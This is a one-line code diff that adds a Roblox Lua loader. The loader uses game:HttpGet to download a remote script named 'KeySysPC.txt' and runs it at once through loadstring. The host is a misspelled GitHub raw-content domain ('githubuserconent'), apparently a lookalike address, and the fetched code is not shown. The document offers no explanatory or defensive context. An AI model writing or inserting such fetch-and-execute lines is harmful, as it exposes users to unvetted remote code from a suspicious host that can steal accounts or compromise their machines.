@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubuserconent.com/JohnBardot/PC/main/KeySysPC.txt"))()
